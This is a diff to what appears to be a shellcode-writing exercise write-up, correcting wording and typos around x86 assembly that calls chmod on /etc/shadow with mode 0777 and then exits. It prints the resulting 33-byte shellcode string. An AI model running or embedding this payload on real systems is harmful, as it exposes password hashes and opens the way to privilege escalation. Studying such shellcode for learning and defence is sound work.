@@ -69,7 +69,7 @@ push 0x68732f2f         ; "hs//"
 push 0x6374652f         ; "cte/"
 ```
 
-The rest of the instructions are the same, however, I also added a call to exit() so the shellcode exits gracefully. Since we can assume the chmod returns the value of 0, I will increment it's value to reference the exit syscall.
+The rest of the instructions are the same, however, I also added a call to exit() so the shellcode exits gracefully. Since we can assume the chmod returns the value of 0 upon success, I will increment it's value to `0x1` and execute the exit() syscall.
 
 ```assembly
 inc eax
@@ -112,7 +112,7 @@ _start:
     int 0x80
 ```
 
-New Shellcoe (Lenth: 33)
+New Shellcode (Lenth: 33)
 
 ```c
 "\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xff\x01\x66\x59\xb0\x0f\xcd\x80\x40\xcd\x80"
